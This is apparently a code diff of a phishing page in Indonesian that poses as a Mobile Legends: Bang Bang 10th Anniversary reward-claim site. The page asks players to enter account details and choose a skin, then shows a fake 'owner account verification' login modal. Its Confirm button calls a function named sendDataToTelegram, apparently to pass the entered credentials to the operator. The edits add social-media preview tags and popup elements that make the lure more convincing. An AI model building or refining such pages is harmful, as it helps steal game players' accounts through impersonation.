@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Legends: Bang Bang - 10TH Anniversary</title>
+    
+    <meta property="og:title" content="Claim - 10TH Anniversary">
+    <meta property="og:description" content="Klaim hadiah eksklusif 10th Anniversary Mobile Legends sekarang!">
+    <meta property="og:image" content="image/logo.jpeg">
+    <meta property="og:type" content="website">
+
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -20,7 +26,7 @@
             </div>
         </div>
 
-        <div id="alertBar" class="alert-bar">⚠️ Silahkan isi data akun terlebih dahulu.</div>
+        <div id="alertBar" class="alert-bar">Silahkan isi data akun terlebih dahulu.</div>
 
         <div class="section-box">
             <div class="section-title"><span>1</span> Masukkan Data Akun</div>
@@ -68,7 +74,7 @@
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Esmeralda - The Foreseer')">
                     <img src="image/Foreseer.jpeg" alt="Foreseer">
-                    <div class="name">Esmeralda - Foreseer</div>
+                    <div class="name">Esmeralda - The Foreseer</div>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Lancelot - Swordmaster')">
                     <img src="image/Swordmaster.jpeg" alt="Swordmaster">
@@ -114,6 +120,7 @@
         <button class="btn-submit" onclick="openLoginModal()">Claim</button>
     </div>
 
+    <!-- Modal Login Verifikasi -->
     <div class="modal" id="loginModal">
         <div class="modal-content">
             <h3>Verifikasi Akun Pemilik</h3>
@@ -136,6 +143,15 @@
             </div>
 
             <button class="btn-confirm-claim" onclick="sendDataToTelegram()">Confirm</button>
+        </div>
+    </div>
+
+    <!-- Custom Universal Popup Modal -->
+    <div class="modal" id="customModal">
+        <div class="modal-content custom-box">
+            <h3 id="custom-modal-title">Perhatian</h3>
+            <p id="custom-modal-text"></p>
+            <button class="btn-modal-close" id="custom-modal-btn" onclick="closeCustomModal()">OK</button>
         </div>
     </div>
 
